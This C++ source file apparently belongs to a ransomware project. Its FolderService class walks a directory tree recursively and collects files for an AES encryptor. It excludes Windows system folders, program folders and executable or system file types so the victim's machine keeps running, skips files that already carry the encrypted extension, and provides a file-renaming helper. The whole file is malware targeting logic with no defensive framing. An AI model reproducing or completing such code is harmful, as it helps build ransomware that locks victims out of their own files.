//
// Created by 33768 on 1/15/2023.
//
#include <string.h>
#include <iostream>
#include "FolderService.h"
#include "AESEncryptor.h"

using namespace std;
using namespace std::filesystem;

FolderService::FolderService() {
    this->rootPath = DEFAULT_ROOT_FOLDER;
    initializeExcludedFilesAndFolders();
}

FolderService::FolderService(path rootFolder) {
    this->rootPath = rootFolder;
    initializeExcludedFilesAndFolders();
}

void FolderService::initializeExcludedFilesAndFolders() {
    // Initialisation de la liste statique des parties de chemins à écarter
    m_exclude_paths.push_back("Microsoft");
    m_exclude_paths.push_back("microsoft");
    m_exclude_paths.push_back("\\Windows");
    m_exclude_paths.push_back("Windows");
    m_exclude_paths.push_back("windows");
    m_exclude_paths.push_back("Program Files");
    m_exclude_paths.push_back("\\Program Files");
    m_exclude_paths.push_back("Program Files (x86)");
    m_exclude_paths.push_back("\\Program Files (x86)");
    m_exclude_paths.push_back("ProgramData");
    m_exclude_paths.push_back("\\ProgramData");
    m_exclude_paths.push_back("\\AppData");
    m_exclude_paths.push_back("AppData");
    m_exclude_paths.push_back("OneDrive");
    m_exclude_paths.push_back("\\OneDrive");
    m_exclude_paths.push_back(".exe");
    m_exclude_paths.push_back(".dll");
    m_exclude_paths.push_back(".sys");
    m_exclude_paths.push_back(".bak");
    m_exclude_paths.push_back(".old");
    m_exclude_paths.push_back(".tmp");
    m_exclude_paths.push_back(".avhd");
    m_exclude_paths.push_back(".avh");
    m_exclude_paths.push_back(".avb");
    m_exclude_paths.push_back(".dvp");
    m_exclude_paths.push_back(".db");
    m_exclude_paths.push_back(".dat");
    m_exclude_paths.push_back(".log");
    m_exclude_paths.push_back(".sdb");
    m_exclude_paths.push_back(".swp");
    m_exclude_paths.push_back(".swo");
    m_exclude_paths.push_back(".vhd");
    m_exclude_paths.push_back(".bkf");
    m_exclude_paths.push_back(".svg");
}

FolderService::~FolderService() {}

void FolderService::getFiles(const std::filesystem::path rootPath, vector<path>* fileList, bool isEncryption) {
    if (is_directory(rootPath)) {
        directory_iterator itrDirectory;
        try {
            for (directory_iterator startDirectory(rootPath); startDirectory != itrDirectory; startDirectory++) {
                getFiles(startDirectory->path(), fileList, isEncryption);
            }
        } catch (const std::filesystem::filesystem_error& e) {
            std::cout<<"[ENCRYPTION-ERROR] [LIST-FILES-ERROR]: "<<e.what()<<std::endl;
        }
    } else {
        std::string path = rootPath.string();

        // Vérifie si le chemin contient l'une des parties de chemins à écarter
        bool exclude = is_excluded(path, isEncryption);

        if (!exclude) {
            fileList->push_back(rootPath);
        } else {
            std::cout<<"[Excluded file/Repo]: "<<path<<std::endl;
        }
    }
}

void FolderService::getFiles(vector<path>* fileList, bool isEncryption) {
    this->getFiles(this->rootPath, fileList, isEncryption);
}

void FolderService::renameFileName(path filePath, std::string newFileName) {
    string newName = filePath.parent_path().string() + "\\" + newFileName;
    if (rename(filePath.string().c_str(),newName.c_str()) != 0) {
        // Affichage d'un message d'erreur incluant le code et le message d'erreur
        cerr << "Error rename" << filePath << " Error: " << strerror(errno) << endl;
    } else {
        // Affichage d'un message de réussite si le renommage a réussi
        cout << "File " << filePath << "rename success" << endl;
    }
}

bool FolderService::is_excluded(std::string path, bool isEncryption) {
    bool exclude = false;
    for (const std::string& exclude_path : m_exclude_paths) {
        if (path.find(exclude_path) != std::string::npos) {
            exclude = true;
            break;
        }
    }

    if (isEncryption && path.find(AESEncryptor::ENCRYPTED_FILES_EXTENSION) != std::string::npos) {
        exclude = true;
    }

    return exclude;
}

std::filesystem::path FolderService::getRootPath() const {
    return this->rootPath;
}
